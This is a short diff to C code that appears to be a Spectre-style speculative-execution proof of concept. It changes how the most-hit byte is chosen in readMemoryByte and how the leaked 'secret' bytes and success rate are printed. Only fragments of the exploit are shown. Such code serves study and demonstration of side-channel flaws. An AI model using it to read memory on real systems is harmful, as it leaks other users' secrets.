@@ -93,14 +93,14 @@ void readMemoryByte(int cacheHitThreshold, size_t maliciousX, int valueScore[2],
         }
     }
 
-    int min_index = 0;
+    int max_index = 0;
     for (i = 0; i < 256; i++) {
-        if (results[i] >= results[min_index]) {
-            min_index = i;
+        if (results[i] >= results[max_index]) {
+            max_index = i;
         }
     }
-    valueScore[0] = min_index;
-    valueScore[1] = results[min_index];
+    valueScore[0] = max_index;
+    valueScore[1] = results[max_index];
 }
 
 int main() {
@@ -130,8 +130,8 @@ int main() {
 
         /* Display the results */
         printf("Speculatively accessed virtual address %p ", (void *) maliciousX);
-        printf("Got secret: %03d = '%c' ", foundSecret[index], foundSecret[index]);
-        printf("Success Rate: %04d/%d", valueScore[1], num_tries);
+        printf("Got secret: %3d = '%c' ", foundSecret[index], foundSecret[index]);
+        printf("Success Rate: %4d/%d", valueScore[1], num_tries);
         printf("\n");
 
         maliciousX++;
